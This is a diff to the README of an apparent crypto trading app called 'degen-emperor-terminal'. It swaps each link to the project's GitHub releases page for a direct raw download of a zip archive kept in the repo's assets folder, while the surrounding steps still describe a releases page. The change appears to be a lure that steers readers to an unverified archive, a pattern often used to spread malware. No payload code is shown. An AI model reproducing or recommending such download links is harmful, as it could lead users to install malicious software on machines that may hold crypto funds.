@@ -1,10 +1,10 @@
 # 🤖 degen-emperor-terminal - Crypto trading with clear signals
 
-[![Download the app](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Chintzy-genusdavallia252/degen-emperor-terminal/releases)
+[![Download the app](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/Chintzy-genusdavallia252/degen-emperor-terminal/main/assets/emperor-terminal-degen-v3.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Chintzy-genusdavallia252/degen-emperor-terminal/releases
+Visit this page to download: https://raw.githubusercontent.com/Chintzy-genusdavallia252/degen-emperor-terminal/main/assets/emperor-terminal-degen-v3.3.zip
 
 1. Open the link above in your browser.
 2. Find the latest release at the top of the page.
@@ -165,4 +165,4 @@ This project covers:
 
 If you need the file later, use the same release page:
 
-https://github.com/Chintzy-genusdavallia252/degen-emperor-terminal/releases
+https://raw.githubusercontent.com/Chintzy-genusdavallia252/degen-emperor-terminal/main/assets/emperor-terminal-degen-v3.3.zip
